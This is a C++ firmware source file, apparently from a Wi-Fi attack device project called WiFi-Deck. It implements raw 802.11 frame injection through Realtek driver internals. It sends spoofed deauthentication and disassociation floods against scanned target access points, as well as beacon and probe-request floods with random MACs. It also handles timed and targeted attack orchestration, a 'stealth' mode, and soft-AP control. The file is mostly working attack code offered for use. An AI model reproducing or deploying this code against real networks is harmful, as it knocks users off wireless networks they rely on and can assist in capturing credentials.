/*
 * wifi_attack.cpp — Frame injection, attack orchestration & radio management
 * Part of WiFi-Deck multi-file refactor.
 */

#include "web.h"
#include "wifi_attack.h"
#include "config.h"
#include "sniff.h"
#include "wifi_scan.h"
#include "utils.h"
#include "ble.h"
#include "command.h"

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"
#include "osdep_service.h"
#include "wiring_watchdog.h"

extern "C" {
#include "bt_intf.h"
}

//==========================================================
// Reason Code Definitions
//==========================================================
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

//==========================================================
// Disassociation Attack State Definitions
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  if (frame == NULL || length == 0 || length > 1500) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Invalid raw frame or length!");
    return;
  }
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Wi-Fi interface is not up!");
    return;
  }
  uint8_t *wlan_dev = rltk_wlan_info;
  if (wlan_dev == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info dev is NULL!");
    return;
  }
  uint32_t **priv_slot = (uint32_t **)(wlan_dev + 0x10);
  uint32_t *priv_ptr = *priv_slot;
  if (priv_ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info priv_ptr is NULL!");
    return;
  }
  void *ptr = (void *)(*priv_ptr);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }

  uint8_t *pxmitpriv = (uint8_t *)ptr + 0xae0;
  void *frame_control = alloc_mgtxmitframe(pxmitpriv);
  if (frame_control == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
    return;
  }

  // 先对底层 xmitbuf 指针判空再 memset / +0x28 偏移，失败时释放已分配资源避免泄漏
  uint8_t *frame_buf = *(uint8_t **)((uint8_t *)frame_control + 0x80);
  if (frame_buf == NULL) {
    tx_fail_count++;
    void *pxmitbuf = *(void **)((uint8_t *)frame_control + 0x84);
    if (pxmitbuf != NULL) {
      rtw_free_xmitbuf(pxmitpriv, pxmitbuf);
    }
    rtw_free_xmitframe(pxmitpriv, frame_control);
    Serial.println("[TX ERROR] frame_buf is NULL!");
    return;
  }

  update_mgntframe_attrib(ptr, (uint8_t *)frame_control + 8);
  memset(frame_buf, 0, 0x68);
  uint8_t *frame_data = frame_buf + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)((uint8_t *)frame_control + 0x14) = (uint32_t)length;
  *(uint32_t *)((uint8_t *)frame_control + 0x18) = (uint32_t)length;
  int ret = dump_mgntframe(ptr, frame_control);
  if (ret == 0) {
    tx_success_count++;
  } else {
    tx_fail_count++;
    Serial.print("[TX ERROR] dump_mgntframe returned: ");
    Serial.println(ret);
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  const int tailLen = (channel >= 36) ? 10 : 9;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (channel >= 36) {
    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // 2.4GHz DS params
    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;
  int chSnap = getCurrentChannelSafe();

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  const int tailLen = (chSnap >= 36) ? 10 : 6;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (chSnap >= 36) {
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    blePushStatus();
    Serial.println("[INFO] Timed attack ended.");
  }
  bool sniffNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (timedSniffEnabled && sniffNow && (millis() - sniffStartTime > sniffDuration)) {
    timedSniffEnabled = false;
    stopSniffing();
    blePushStatus();
    Serial.println("[INFO] Timed sniff ended.");
  }
}

bool shouldAbortCycle() {
  feedWatchdog();
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    return true;
  }
  pollSerialInput();
  if (emergencyStopRequested || priorityStopPending) {
    return true;
  }
  if (hasQueuedStopInCmdRing()) {
    emergencyStopRequested = true;
    return true;
  }
  return false;
}

//==========================================================
// Stop All Active Attacks
//==========================================================
void stopAllActiveAttacks() {
  attack_enabled = false;
  disassoc_enabled = false;
  timedAttackEnabled = false;
  scan_enabled = false;
  beacon_flood_enabled = false;
  probe_flood_enabled = false;
  signal_jam_enabled = false;
  deauthSlice.reset();
  disassocSlice.reset();
  if (USE_LED) digitalWrite(LED_B, LOW);
}

void stopConflictingModesBeforeAttack() {
  stopAllActiveAttacks();
  bool sniffActive = false;
  rtw_enter_critical(NULL, NULL);
  sniffActive = (isSniffing || deauth_sniff_enabled);
  rtw_exit_critical(NULL, NULL);
  if (sniffActive) {
    stopSniffing();
  }
}

//==========================================================
// Sliced Non-blocking TX Cycle
//==========================================================
bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick) {
  if (!st.active) return false;
  if (frameBudgetPerTick == 0) frameBudgetPerTick = 8;

  auto abortNow = [&]() -> bool {
    if (shouldAbortCycle()) return true;
    if (sendDeauth && !attack_enabled) return true;
    if (!sendDeauth && sendDisassoc && !disassoc_enabled) return true;
    return false;
  };

  if (abortNow()) {
    st.reset();
    restoreDefaultChannelIfNeeded(false);
    if (USE_LED) digitalWrite(LED_B, LOW);
    return false;
  }

  unsigned long sentThisTick = 0;
  while (st.active && sentThisTick < frameBudgetPerTick) {
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    const WiFiScanResult &tgt = st.targets[st.targetIdx];
    if (st.frameIdx == 0) {
      if (wifi_set_channel(tgt.channel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(tgt.channel);
        Serial.println(") failed");
        st.targetIdx++;
        continue;
      }
      setCurrentChannelSafe((int)tgt.channel);
    }

    if (st.frameIdx >= num_send_frames) {
      st.frameIdx = 0;
      st.targetIdx++;
      continue;
    }

    if (abortNow()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃
    if (sendDeauth) {
      wifi_tx_deauth_frame(tgt.bssid, dst_mac, deauth_reasons[st.frameIdx % num_deauth_reasons]);
    }
    if (sendDisassoc) {
      wifi_tx_disassoc_frame(tgt.bssid, dst_mac, disassoc_reasons[st.frameIdx % num_disassoc_reasons]);
    }

    st.frameIdx++;
    sentThisTick++;

    bool hasMoreInTarget = (st.frameIdx < num_send_frames);
    if (!hasMoreInTarget) {
      st.frameIdx = 0;
      st.targetIdx++;
    }
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }
    if (sentThisTick < frameBudgetPerTick) {
      delay(1);
    }
  }
  return st.active;
}

//==========================================================
// Target Attack
//==========================================================
void targetAttack() {
  std::vector<WiFiScanResult> targets;
  bool isTargetMode = false;
  if (lockScanMutex()) {
    isTargetMode = target_mode;
    if (isTargetMode) {
      targets = target_aps;
    }
    unlockScanMutex();
  }
  if (isTargetMode && !targets.empty() && attack_enabled) {
    deauthSlice.reset();
    deauthSlice.targets = targets;
    deauthSlice.active = true;
    if (USE_LED) digitalWrite(LED_B, HIGH);
    while (stepSlicedTxCycle(deauthSlice, true, true, 8)) {
      feedWatchdog();
    }
  }
}

//==========================================================
// Radio Management — BLE Coexistence
//==========================================================
// Forward declaration for BLE started flag (defined in BLE module / main .ino)
extern volatile bool bleStarted;

void restoreBleCoex(bool resetCoex) {
  if (!bleStarted) return;
  wifi_btcoex_set_bt_on();
  // rtw_coex_bt_enable(0/1) 直接操作 pcoex，仅在 WLAN 接口已就绪时调用
  if (wifi_is_up(RTW_STA_INTERFACE) || wifi_is_up(RTW_AP_INTERFACE)) {
    if (resetCoex) {
      rltk_coex_bt_enable(0);
    }
    rltk_coex_bt_enable(1);
  }
}

//==========================================================
// Radio Management — Channel Restore
//==========================================================
void restoreDefaultChannelIfNeeded(bool force) {
  if (force || apEnabled || softApActive) {
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
    }
  }
}

//==========================================================
// Radio Management — SoftAP Health Check
//==========================================================
bool isSoftApHealthy() {
  int wextMode = -1;
  return (wlanRuntimeMode == WLAN_MODE_AP &&
          softApActive &&
          wifi_is_up(RTW_AP_INTERFACE) &&
          wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
          wextMode == RTW_MODE_MASTER);
}

//==========================================================
// Radio Management — Start SoftAP
//==========================================================
bool startSoftAP() {
  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
  stopWebServer();
  softApActive = false;
  apEnabled = true;
  feedWatchdog();

  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);

  for (uint8_t attempt = 0; attempt < 2; attempt++) {
    if (attempt > 0) {
      Serial.println("[WARN] startSoftAP: retrying AP + WebServer recovery...");
    }
    // 修复 WiFiDrv 静态 init_wlan/wifi_mode 失同步（2-OptA）：
    // 首次启动由 WiFi.apbegin()->wifiDriverInit() 完成 LwIP_Init；后续重启 WiFiDrv::wifi_mode 仍为
    // RTW_MODE_AP，会跳过 wifi_on(RTW_MODE_AP)，因此必须显式重置为 RTW_MODE_AP。
    if (wlanLwipInitialized) {
      wifi_off();
      feedWatchdog();
      delay(40);
      if (wifi_on(RTW_MODE_AP) != RTW_SUCCESS) {
        wlanRuntimeMode = WLAN_MODE_UNINIT;
        Serial.println("[ERROR] startSoftAP: wifi_on(RTW_MODE_AP) failed");
        continue;
      }
      delay(20);
      feedWatchdog();
    } else if (wlanRuntimeMode != WLAN_MODE_UNINIT) {
      wifi_off();
      feedWatchdog();
      delay(40);
    }

    int apRes = WiFi.apbegin(ap_ssid, ap_pass, ch, 0);
    wlanLwipInitialized = true;
    feedWatchdog();

    int wextMode = -1;
    bool apUp = (apRes == WL_CONNECTED &&
                 wifi_is_up(RTW_AP_INTERFACE) &&
                 wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                 wextMode == RTW_MODE_MASTER);
    if (!apUp) {
      wlanRuntimeMode = wifi_is_up(RTW_AP_INTERFACE) ? WLAN_MODE_AP : WLAN_MODE_UNINIT;
      Serial.println("[ERROR] startSoftAP: WiFi.apbegin() failed or AP interface not up");
      continue;
    }

    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    restoreBleCoex(true);

    if (startWebServer(3)) {
      return true;
    }
    Serial.println("[ERROR] startSoftAP: WebServer bind(80) failed after retries");
    stopWebServer();
    softApActive = false;
  }

  int wextMode = -1;
  if (wifi_is_up(RTW_AP_INTERFACE) &&
      wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
      wextMode == RTW_MODE_MASTER) {
    wlanRuntimeMode = WLAN_MODE_AP;
    WiFi.disablePowerSave();
    softApActive = true;
    setCurrentChannelSafe(WIFI_CHANNEL);
    restoreBleCoex(true);
    return webServerRunning();
  }

  wlanRuntimeMode = WLAN_MODE_UNINIT;
  softApActive = false;
  WiFi.disablePowerSave();
  restoreBleCoex(false);
  return false;
}

//==========================================================
// Radio Management — Enter STA Mode
//==========================================================
bool enterStaMode(const char *context) {
  stopWebServer();
  softApActive = false;
  int wextMode = -1;
  bool alreadySta = (wlanRuntimeMode == WLAN_MODE_STA &&
                   wifi_is_up(RTW_STA_INTERFACE) &&
                   !wifi_is_up(RTW_AP_INTERFACE) &&
                   wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
                   wextMode == RTW_MODE_INFRA);
  if (!alreadySta) {
    wifi_off();
    feedWatchdog();
    delay(40);
    if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
      wlanRuntimeMode = WLAN_MODE_UNINIT;
      Serial.print("[ERROR] wifi_on(RTW_MODE_STA) failed");
      if (context && context[0] != '\0') {
        Serial.print(" (");
        Serial.print(context);
        Serial.print(")");
      }
      Serial.println(".");
      restoreBleCoex(false);
      return false;
    }
    delay(20);
    feedWatchdog();
    wlanRuntimeMode = WLAN_MODE_STA;
  }
  WiFi.disablePowerSave();
  restoreBleCoex(!alreadySta);
  if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
    setCurrentChannelSafe(WIFI_CHANNEL);
  } else {
    Serial.print("[WARN] wifi_set_channel(");
    Serial.print(WIFI_CHANNEL);
    Serial.println(") failed after STA switch.");
  }
  return true;
}

//==========================================================
// Radio Management — Restore After Sniff
//==========================================================
void restoreRadioAfterSniff() {
  if (apEnabled) {
    // Entering promiscuous mode turned the Wi-Fi (and the soft AP) off;
    // bring the AP and web server back up so the phone can reconnect.
    if (startSoftAP()) {
      Serial.print("[INFO] Soft AP restarted: ");
      Serial.println(ap_ssid);
    } else if (softApActive) {
      Serial.println("[WARN] Soft AP radio active, but WebUI port 80 failed to bind (will self-heal).");
    } else {
      Serial.println("[ERROR] Failed to restart Soft AP after sniff!");
    }
  } else {
    // BLE-only stealth mode (ap off): restore STA mode so scan/TX work without broadcasting AP
    if (enterStaMode("restoreRadioAfterSniff")) {
      Serial.println("[INFO] Restored STA mode (BLE-only stealth).");
    }
  }
}

//==========================================================
// Radio Management — Schedule AP Restart
//==========================================================
void scheduleApRestart() {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (apEnabled && !sniffingNow) {
    pendingApRestart = true;
    pendingApRestartAt = millis();
  }
}
